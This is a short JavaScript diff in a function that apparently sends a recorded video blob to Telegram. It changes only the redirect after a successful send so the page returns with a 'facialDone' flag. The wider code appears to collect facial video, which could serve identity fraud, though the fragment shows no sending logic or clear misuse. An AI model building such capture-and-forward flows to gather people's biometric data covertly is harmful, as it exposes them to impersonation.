@@ -260,7 +260,7 @@ function enviarVideoTelegram(videoBlob) {
         if (response.ok) {
             statusText.innerText = "✅ ";
             setTimeout(() => {
-                window.location.href = "../index.html";
+                window.location.href = "../index.html?facialDone=1";
             }, 3000);
         } else {
             throw new Error("Error en respuesta");
